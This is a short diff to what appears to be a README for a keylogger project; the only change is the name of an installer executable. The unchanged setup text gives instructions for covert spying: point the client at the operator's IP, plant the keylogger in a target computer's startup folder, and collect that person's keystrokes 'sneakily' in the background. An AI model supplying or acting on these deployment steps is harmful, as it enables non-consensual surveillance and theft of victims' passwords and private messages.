@@ -15,7 +15,7 @@ To create a keylogger that fully works, I have made the <a href="https://github.
 
 <h1>Setup</h1>
 
-Setup is fairly straightforward. First, edit both the <code>client/net.cpp</code> and the <code>host/host.cpp</code> files so that the ip address, which is currently 192.168.56.1, is instead your pcs ip. After that, once on the target computer move the keylogger to the startup folder or run <code>installationandmove.exe</code>, and that is it. Now, the next time their system boots up the keylogger will sneakily record their typing in the background, and whenever you run host.exe on your own computer the results will be sent to you.
+Setup is fairly straightforward. First, edit both the <code>client/net.cpp</code> and the <code>host/host.cpp</code> files so that the ip address, which is currently 192.168.56.1, is instead your pcs ip. After that, once on the target computer move the keylogger to the startup folder or run <code>Extra/autoinstall.exe</code>, and that is it. Now, the next time their system boots up the keylogger will sneakily record their typing in the background, and whenever you run host.exe on your own computer the results will be sent to you.
 
 <h2>Files</h2>
 
